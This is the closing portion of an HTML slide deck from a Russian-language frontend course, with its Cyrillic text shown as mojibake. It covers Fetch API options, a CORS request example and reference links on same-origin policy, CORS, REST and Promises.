			–û–Ω –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —É–ª—É—á—à–µ–Ω–Ω—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è –æ—Å—É—â–µ—Å—Ç–≤–ª–µ–Ω–∏—è –∑–∞–ø—Ä–æ—Å–æ–≤ –∫ —Å–µ—Ä–≤–µ—Ä—É:
			–∫–∞–∫ –ø–æ —á–∞—Å—Ç–∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π –∏ –∫–æ–Ω—Ç—Ä–æ–ª—è –Ω–∞–¥ –ø—Ä–æ–∏—Å—Ö–æ–¥—è—â–∏–º,
			—Ç–∞–∫ –∏ –ø–æ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å—É, —Ç–∞–∫ –∫–∞–∫ –ø–æ—Å—Ç—Ä–æ–µ–Ω –Ω–∞ <b>–ø—Ä–æ–º–∏—Å–∞—Ö</b>
		</p>
	</blockquote>
	<pre class="hljs js">
		<code>// –°–∏–Ω—Ç–∞–∫—Å–∏—Å –º–µ—Ç–æ–¥–∞ fetch:</code>
		<code>const fetchPromise = fetch(url[, options]);</code>
	</pre>
</section>

<section class="slide">
	<h2>Fetch API options</h2>
	<ul>
		<li><code>method</code> &mdash; –º–µ—Ç–æ–¥ –∑–∞–ø—Ä–æ—Å–∞</li>
		<li><code>headers</code> &mdash; –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∑–∞–ø—Ä–æ—Å–∞ (–æ–±—ä–µ–∫—Ç)</li>
		<li><code>body</code> &mdash; —Ç–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞: <code>FormData</code>, <code>Blob</code>, —Å—Ç—Ä–æ–∫–∞ –∏ —Ç.–ø.</li>
		<li><code>mode</code> &mdash; –æ–¥–Ω–æ –∏–∑: ¬´same-origin¬ª, ¬´no-cors¬ª, ¬´cors¬ª, —É–∫–∞–∑—ã–≤–∞–µ—Ç, –≤ –∫–∞–∫–æ–º —Ä–µ–∂–∏–º–µ –∫—Ä–æ—Å—Å-–¥–æ–º–µ–Ω–Ω–æ—Å—Ç–∏ –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ—Ç—Å—è –¥–µ–ª–∞—Ç—å –∑–∞–ø—Ä–æ—Å</li>
		<li><code>credentials</code> &mdash; –æ–¥–Ω–æ –∏–∑: ¬´omit¬ª, ¬´same-origin¬ª, ¬´include¬ª, —É–∫–∞–∑—ã–≤–∞–µ—Ç, –ø–µ—Ä–µ—Å—ã–ª–∞—Ç—å –ª–∏ –∫—É–∫–∏ –∏ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –≤–º–µ—Å—Ç–µ —Å –∑–∞–ø—Ä–æ—Å–æ–º</li>
		<li><code>cache</code> &mdash; –æ–¥–Ω–æ –∏–∑ ¬´default¬ª, ¬´no-store¬ª, ¬´reload¬ª, ¬´no-cache¬ª, ¬´force-cache¬ª, ¬´only-if-cached¬ª, —É–∫–∞–∑—ã–≤–∞–µ—Ç, –∫–∞–∫ –∫–µ—à–∏—Ä–æ–≤–∞—Ç—å –∑–∞–ø—Ä–æ—Å</li>
	</ul>
</section>

<section class="slide">
	<h2>Fetch API</h2>
	<pre class="hljs js">
		<code>fetch('/books', {</code>
		<code>	method: 'POST',</code>
		<code>	mode: 'cors',</code>
		<code>	credentials: 'include',</code>
		<code>	data: JSON.stringify({</code>
		<code>		title: '–ò–∑—É—á–µ–Ω–∏–µ –§—Ä–æ–Ω—Ç–µ–Ω–¥–∞',</code>
		<code>		authors: [</code>
		<code>			'–ê–Ω–∞—Ç–æ–ª–∏–π –û—Å—Ç–∞–ø–µ–Ω–∫–æ', '–î–º–∏—Ç—Ä–∏–π –î–æ—Ä–æ—Ñ–µ–µ–≤',</code>
		<code>			'–°–µ—Ä–≥–µ–π –í–æ–ª–æ–¥–∏–Ω', '–ê–ª–µ–∫—Å–µ–π –¢—é–ª—å–¥—é–∫–æ–≤'</code>
		<code>		]</code>
		<code>	})</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–í–ê–ñ–ù–û: —Ä–∞–±–æ—Ç–∞ —Å CORS –≤ Fetch API</h2>
	<pre class="hljs js">
		<code>fetch('/books', {</code>
		<code>	method: 'POST',</code>
		<code>	<mark>mode: 'cors',</mark></code>
		<code>	<mark>credentials: 'include',</mark></code>
		<code>	data: JSON.stringify({</code>
		<code>		title: '–ò–∑—É—á–µ–Ω–∏–µ –§—Ä–æ–Ω—Ç–µ–Ω–¥–∞',</code>
		<code>		authors: [</code>
		<code>			'–ê–Ω–∞—Ç–æ–ª–∏–π –û—Å—Ç–∞–ø–µ–Ω–∫–æ', '–î–º–∏—Ç—Ä–∏–π –î–æ—Ä–æ—Ñ–µ–µ–≤',</code>
		<code>			'–°–µ—Ä–≥–µ–π –í–æ–ª–æ–¥–∏–Ω', '–ê–ª–µ–∫—Å–µ–π –¢—é–ª—å–¥—é–∫–æ–≤'</code>
		<code>		]</code>
		<code>	})</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<!--–∑–∞–∫–æ–Ω—á–∏–ª–∏ —Å Promise –∏ Fetch API-->

<section class="slide">
	<h2>–ü–æ–ª–µ–∑–Ω—ã–µ —Å—Å—ã–ª–∫–∏</h2>
	<ul lang="en">
		<li>Same-origin policy –æ–ø–∏—Å–∞–Ω–æ <a
				href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank">–∑–¥–µ—Å—å
			(MDN)</a> –∏
			<a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank">–∑–¥–µ—Å—å (wiki)</a></li>
		<li>–ú–µ—Ç–æ–¥–∞ –æ–±—Ö–æ–¥–∞ Same-origin policy <a
				href="http://stackoverflow.com/questions/3076414/ways-to-circumvent-the-same-origin-policy"
				target="_blank">stackoverflow</a></li>
		<li>Iframe: <a href="https://webref.ru/html/iframe" target="_blank">WebReference.ru</a> –∏ <a
				href="https://learn.javascript.ru/same-origin-policy" target="_blank">learn.javascript.ru</a></li>
		<li>–ö—Ä–æ—Å—Å–¥–æ–º–µ–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã –Ω–∞ <a href="https://learn.javascript.ru/xhr-crossdomain" target="_blank">learn.javascript.ru</a>
		</li>
		<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS" target="_blank">–û–ø–∏—Å–∞–Ω–∏–µ</a>
			HTTP access control (CORS)
		</li>
		<li>–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è –∫ <strong>Spring</strong> –ø—Ä–æ CORS: <a
				href="https://spring.io/blog/2015/06/08/cors-support-in-spring-framework" target="_blank">–∑–¥–µ—Å—å</a></li>
		<li>API (application programming interface) <a
				href="https://en.wikipedia.org/wiki/Application_programming_interface" target="_blank">wiki</a></li>
		<li>–î–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ API —Å –ø–æ–º–æ—â—å—é <a href="http://swagger.io/" target="_blank">swagger</a>, <a
				href="https://apiary.io/" target="_blank">apiary</a> –∏–ª–∏ <a href="https://apiblueprint.org/"
																			target="_blank">apiblueprint</a></li>
	</ul>
</section>

<section class="slide">
	<h2>–ü–æ–ª–µ–∑–Ω—ã–µ —Å—Å—ã–ª–∫–∏</h2>
	<ul lang="en">
		<li>–°–µ–º–∞–Ω—Ç–∏—á–µ—Å–∫–∏–π API: <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete" target="_blank">CRUD</a>
			–∏
			<a href="http://www.ibm.com/developerworks/ru/library/ws-restfu/" target="_blank">REST</a></li>
		<li>–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ JavaScript <a href="https://jasmine.github.io/" target="_blank">—Å –ø–æ–º–æ—â—å—é Jasmine</a></li>
		<li>–û—á–µ–Ω—å –ø–æ–¥—Ä–æ–±–Ω—ã–µ –ø–æ—Å—Ç—ã, –ø—Ä–æ Promise –Ω–∞ <a href="https://learn.javascript.ru/promise" target="_blank">learn.javascript.ru</a>
			–∏ –Ω–∞
			<a href="https://habrahabr.ru/post/209662/" target="_blank">—Ö–∞–±—Ä–µ</a></li>
		<li><a href="https://learn.javascript.ru/fetch" target="_blank">Fetch API</a></li>
	</ul>
</section>

<section class="slide">
	<h2 class="shout">–í—Å–µ–º —Å–ø–∞—Å–∏–±–æ!</h2>
</section>

<div class="progress"></div>
<script src="/lib/shower/shower.min.js"></script>
<script src="/lib/hljs/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

<script src="/reload/reload.js"></script>
<script src="https://cdn.jsdelivr.net/gh/ireade/caniuse-embed/public/caniuse-embed.min.js"></script>
</body>
</html>
